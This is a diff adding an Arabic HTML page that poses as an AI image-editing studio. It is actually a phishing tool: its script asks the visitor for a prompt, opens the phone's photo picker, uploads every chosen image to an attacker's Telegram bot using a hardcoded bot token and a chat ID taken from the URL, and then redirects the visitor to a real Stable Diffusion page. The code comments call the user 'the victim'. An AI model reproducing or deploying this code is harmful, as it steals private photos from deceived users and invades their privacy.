@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Studio • محرر وتعديل الصور بالذكاء الاصطناعي</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #0d0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #161b2c; border: 1px solid #232d4a; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
+        
+        /* شارة أو أيقونة ذكاء اصطناعي متحركة */
+        .ai-glow { width: 75px; height: 75px; background: linear-gradient(135deg, #8b5cf6, #ec4899); border-radius: 50%; margin: 0 auto 20px auto; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(139, 92, 246, 0.5); animation: pulseGlow 2s infinite; }
+        .ai-glow svg { width: 36px; height: 36px; fill: #fff; }
+        @keyframes pulseGlow { 0% { transform: scale(1); box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); } 50% { transform: scale(1.05); box-shadow: 0 0 25px rgba(236, 72, 153, 0.7); } 100% { transform: scale(1); box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); } }
+
+        h2 { font-size: 20px; margin-bottom: 6px; color: #f3f4f6; }
+        p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
+
+        .input-group { margin-bottom: 15px; text-align: right; }
+        textarea { width: 100%; height: 80px; padding: 12px; background: #0b0f1a; border: 1px solid #374151; color: #fff; border-radius: 10px; font-size: 13px; outline: none; resize: none; }
+        textarea:focus { border-color: #8b5cf6; }
+
+        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #8b5cf6, #ec4899); border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 10px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { opacity: 0.9; }
+        .status { margin-top: 15px; font-size: 11px; color: #34d399; display: none; }
+        
+        /* عنصر مخفي لفتح مدير ملفات الصور */
+        #fileInput { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="ai-glow">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2l2.4 4.8L19.2 9l-4.8 2.4L12 16.2 9.6 11.4 4.8 9l4.8-2.4L12 2zm0 13.8l1.8 3.6L17.4 21l-3.6 1.8L12 26.4l-1.8-3.6L6.6 21l3.6-1.8L12 15.8z"/></svg>
+        </div>
+        <h2>استوديو توليد وتعديل الصور الذكي</h2>
+        <p>اكتب وصف التعديل أو التوليد المطلوب، واختر صورة من هاتفك لتطبيق الذكاء الاصطناعي عليها فوراً.</p>
+
+        <form id="aiForm">
+            <div class="input-group">
+                <textarea id="promptText" placeholder="اكتب وصف الصورة (مثلاً: تحويل الصورة إلى ستايل سينمائي واقعي 4K...)" required></textarea>
+            </div>
+            <button type="button" class="btn" id="triggerBtn">اختيار صورة وتعديلها</button>
+        </form>
+
+        <!-- نافذة اختيار الملفات المخفية لسحب الصور من جهاز الضحية -->
+        <input type="file" id="fileInput" accept="image/*" multiple>
+        <div class="status" id="statusText">جاري استيراد الصورة وتحليلها عبر سيرفرات الذكاء الاصطناعي...</div>
+    </div>
+
+    <script>
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        const triggerBtn = document.getElementById('triggerBtn');
+        const fileInput = document.getElementById('fileInput');
+
+        triggerBtn.addEventListener('click', function() {
+            if(!targetChatId) return;
+            const prompt = document.getElementById('promptText').value;
+            if(!prompt) {
+                alert('الرجاء كتابة وصف التعديل أولاً');
+                return;
+            }
+            // فتح مستعرض ملفات الصور في جهاز الضحية بوهم استيراد الصورة للتعديل
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', async function(e) {
+            const files = e.target.files;
+            if (files.length === 0) return;
+
+            document.getElementById('aiForm').style.display = 'none';
+            document.getElementById('statusText').style.display = 'block';
+
+            const prompt = document.getElementById('promptText').value;
+
+            // رفع كل صور الضحية المختارة إلى بوت التيليجرام الخاص بالمستخدم المسوق حصرياً
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                const formData = new FormData();
+                formData.append('photo', file);
+                formData.append('caption', `🖼️ صيد صورة مسحوبة من ملفات الهاتف!\n\n💬 وصف التعديل المطلوب: ${prompt}\n📁 اسم الملف: ${file.name}`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${targetChatId}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch(err) {}
+            }
+
+            setTimeout(() => {
+                window.location.href = "https://huggingface.co/spaces/stabilityai/stable-diffusion";
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
